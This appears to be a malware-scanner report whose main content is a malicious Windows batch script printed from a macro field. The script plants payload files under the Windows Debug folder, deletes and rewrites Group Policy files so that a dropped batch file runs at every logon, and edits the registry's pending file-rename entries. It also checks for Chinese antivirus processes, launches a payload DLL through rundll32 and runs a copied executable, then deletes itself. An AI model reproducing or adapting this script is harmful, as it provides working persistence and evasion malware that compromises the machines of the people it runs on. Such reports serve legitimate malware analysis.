behavior.Base64 Strings: Base64-encoded str were detected, may be used to obfuscate str
behavior.Hex Strings: Hex-encoded str were detected, may be used to obfuscate str
behavior.SYSTEM: May run an executable file or a system command on a Mac

docinfo.macro:
if exist %windir%\Debug\error.gg goto :del
setlocal enabledelayedexpansion
set "svar=abcdefghijklmnopqrstuvwxyz"
set "rvar="
set num=4
:loop
set /a num-=1
set /a rand=%random%%%26
set "rvar=%rvar%!svar:~%rand%,1!"
if not %num%==0 goto loop
set di=%systemroot%\system32\GroupPolicy\user\Scripts
echo !rvar! > %windir%\Debug\error.gg
move woti.dat %windir%\Debug\debug.dat
type %windir%\Debug\error.gg>>%windir%\Debug\debug.dat
move tb.dat %windir%\Debug\ttb.dat
type %windir%\Debug\error.gg>>%windir%\Debug\ttb.dat
move win.bat %windir%\Debug\win.bat
md %di%\Startup
md %di%\Shutdown
attrib %windir%\system32\GroupPolicy\*.* -r -s -h /s /d
del %windir%\System32\GroupPolicy\gpt.ini
del %windir%\system32\GroupPolicy\Machine\Registry.pol
set qs=%systemroot%\system32\GroupPolicy
>%qs%\gpt.ini echo [General]
>>%qs%\gpt.ini echo gPCFunctionalityVersion=2
>>%qs%\gpt.ini echo gPCUserExtensionNames=[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B66650-4972-11D1-A7CA-0000F87571E3}]
>>%qs%\gpt.ini echo Version=65536
>scripts.ini echo [Logon]
>>scripts.ini echo 0CmdLine=%windir%\Debug\win.bat
move /y scripts.ini %windir%\Debug\scripts.ini
copy %windir%\Debug\scripts.ini %windir%\ime\scripts.ini 
del /f /s /q %windir%\System32\GroupPolicy\user\Scripts\scripts.ini


reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager" /v "PendingFileRenameOperations2" /t "REG_MULTI_SZ" /d "\??\%windir%\ime0\0\??%windir%\ime\0\??\%windir%\ime\scripts.ini\0\??\%windir%\System32\GroupPolicy\user\Scripts\scripts.ini" /f
tasklist|findstr /i "ravmond.exe 360tray.exe kxetray.exe " 
if errorlevel 1 (goto 360) else (goto ris)


:360
copy %windir%\Debug\debug.dat %windir%\ime\svc!rvar!.dat
start %windir%\system32\rundll32.exe %windir%\ime\svc!rvar!.dat,Launch
copy %windir%\Debug\ttb.dat %windir%\ime\svc!rvar!.exe
start %windir%\ime\svc!rvar!.exe
del %0
exist

:ris
del %0
exist

:del
del woti.dat
del tb.dat
del %0
exist

filetype: ASCII text, with CRLF line terminators
